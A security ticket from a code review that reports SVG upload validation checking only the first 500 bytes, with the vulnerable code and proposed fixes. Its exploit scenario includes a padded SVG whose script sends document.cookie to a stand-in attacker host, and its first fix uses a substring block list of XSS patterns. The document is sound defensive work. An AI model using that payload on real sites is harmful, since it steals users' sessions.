---
status: ready
priority: p2
issue_id: '5178'
tags: [code-review, security, xss, validation, file-upload]
dependencies: []
triage_date: '2026-01-12'
triage_by: master-architect-triage
verified: true
effort: 15min
---

# SVG File Validation Only Checks First 500 Bytes

## Problem Statement

SVG file validation only scans the first 500 bytes for malicious content, allowing attackers to embed JavaScript after byte 500. If SVGs are served without proper Content-Security-Policy headers, this enables stored XSS attacks.

**Why it matters:** Stored XSS vulnerabilities allow attackers to:

- Steal session tokens and cookies
- Perform actions on behalf of users
- Deface tenant storefronts
- Exfiltrate sensitive data

## Findings

**Source:** Security Sentinel agent review (agent ID: a9f11fa)

**Location:** `/Users/mikeyoung/CODING/MAIS/server/src/adapters/upload.adapter.ts:110-124`

**Vulnerable Code:**

```typescript
if (file.mimetype === 'image/svg+xml') {
  const content = file.buffer.toString('utf8', 0, 500).trim(); // ⚠️ Only checks 500 bytes
  const isSvg =
    content.startsWith('<?xml') ||
    content.startsWith('<svg') ||
    content.toLowerCase().includes('<svg');
  if (!isSvg) {
    logger.warn(/* ... */);
    throw new Error('File validation failed');
  }
  return; // ⚠️ Returns early without checking rest of file
}
```

**Vulnerability:** Attacker can create malicious SVG with valid header but embedded JavaScript after byte 500.

**Exploit Scenario:**

```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <!-- Padding to push script after byte 500 -->
  <text>AAAAAA... (repeated 50 times to exceed 500 bytes)</text>
  <script>
    // This code is NOT scanned by validation
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
  </script>
</svg>
```

**Attack Flow:**

1. Attacker uploads malicious SVG with script after byte 500
2. Validation passes (only checks first 500 bytes)
3. SVG stored in S3/database
4. Victim views storefront with embedded SVG
5. If served without CSP, script executes → XSS

**Current Mitigation:** **UNKNOWN** - Need to verify:

- Are images served with `Content-Security-Policy` header?
- Is `Content-Type: image/svg+xml` set correctly?
- Are SVGs served from separate domain (CDN)?

**Impact:** MEDIUM - Exploitable only if CSP headers are missing or misconfigured

## Proposed Solutions

### Solution 1: Scan Full SVG Content (Recommended)

**Approach:** Check entire buffer for dangerous SVG patterns

```typescript
if (file.mimetype === 'image/svg+xml') {
  // Check ENTIRE buffer for dangerous content
  const fullContent = file.buffer.toString('utf8').toLowerCase();

  // Validate SVG structure
  const isSvg =
    fullContent.startsWith('<?xml') ||
    fullContent.startsWith('<svg') ||
    fullContent.includes('<svg');

  if (!isSvg) {
    logger.warn({ filename: file.originalname }, 'Invalid SVG structure');
    throw new Error('File validation failed');
  }

  // Check for dangerous patterns
  const dangerousPatterns = [
    '<script',
    'javascript:',
    'onerror=',
    'onload=',
    'onclick=',
    '<iframe',
    '<object',
    '<embed',
  ];

  for (const pattern of dangerousPatterns) {
    if (fullContent.includes(pattern)) {
      logger.warn({ filename: file.originalname, pattern }, 'SECURITY: Malicious SVG detected');
      throw new Error('File validation failed');
    }
  }

  return; // Safe to upload
}
```

**Pros:**

- Simple fix (scan full file)
- Prevents script injection
- Low performance impact (text scanning is fast)

**Cons:**

- May block legitimate SVGs with inline scripts (rare)

**Effort:** 15 minutes
**Risk:** LOW

### Solution 2: Verify CSP Headers (Immediate)

**Approach:** Check if images are served with proper Content-Security-Policy

**CSP Header to Check:**

```
Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'; img-src 'self';
```

**Verification Steps:**

1. Upload an SVG to a package
2. View the storefront
3. Inspect image request headers
4. Verify CSP header is present and restrictive

**Pros:**

- Defense-in-depth (even if validation bypassed)
- Protects against all XSS in images

**Cons:**

- Doesn't prevent malicious upload, only execution

**Effort:** 30 minutes (investigation)
**Risk:** NONE - Read-only verification

### Solution 3: SVG Sanitization Library

**Approach:** Use dedicated library like `DOMPurify` or `svg-sanitizer`

```typescript
import DOMPurify from 'isomorphic-dompurify';

if (file.mimetype === 'image/svg+xml') {
  const svgContent = file.buffer.toString('utf8');
  const sanitized = DOMPurify.sanitize(svgContent, {
    USE_PROFILES: { svg: true, svgFilters: true },
  });

  // Replace buffer with sanitized content
  file.buffer = Buffer.from(sanitized, 'utf8');
}
```

**Pros:**

- Industry-standard approach
- Handles complex SVG features safely
- Removes all dangerous content

**Cons:**

- Adds dependency (bundle size)
- May modify legitimate SVGs

**Effort:** 1 hour (integrate library)
**Risk:** LOW

## Recommended Action

**Immediate:**

1. Implement Solution 2 (verify CSP headers) - **TODAY**
2. If CSP missing, implement Solution 1 (full scan) - **THIS WEEK**

**Long-term:** 3. Consider Solution 3 (sanitization library) for comprehensive protection

## Technical Details

**Affected Files:**

- `/Users/mikeyoung/CODING/MAIS/server/src/adapters/upload.adapter.ts:110-124`

**Image Serving Configuration:**

- Verify: S3 bucket CORS and headers
- Verify: CloudFront/CDN CSP configuration
- Verify: Next.js image optimization headers

**Testing:**

- Create malicious SVG with script after byte 500
- Upload via photo upload endpoint
- Attempt to view on storefront
- Verify: (a) upload blocked OR (b) script doesn't execute

## Acceptance Criteria

**If CSP Headers Present:**

- [ ] Verify CSP blocks inline scripts in SVGs
- [ ] Document CSP configuration in security docs
- [ ] Add Solution 1 as additional safety layer (defense-in-depth)

**If CSP Headers Missing:**

- [ ] Implement Solution 1 immediately (P1 escalation)
- [ ] Add CSP headers to image serving
- [ ] Test with malicious SVG → upload blocked

**Either Way:**

- [ ] Add integration test for malicious SVG upload
- [ ] Document SVG validation strategy in ADR

## Work Log

| Date       | Action                                         | Learnings                                            |
| ---------- | ---------------------------------------------- | ---------------------------------------------------- |
| 2026-01-11 | Security audit identified partial SVG scanning | First 500 bytes only - script after that not checked |

## Resources

- **Security Review:** Security Sentinel agent (ID: a9f11fa)
- **OWASP:** [XSS via SVG Files](https://owasp.org/www-community/attacks/xss/#stored-xss-attacks)
- **CSP Reference:** [MDN Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- **Sanitization Library:** [DOMPurify](https://github.com/cure53/DOMPurify)
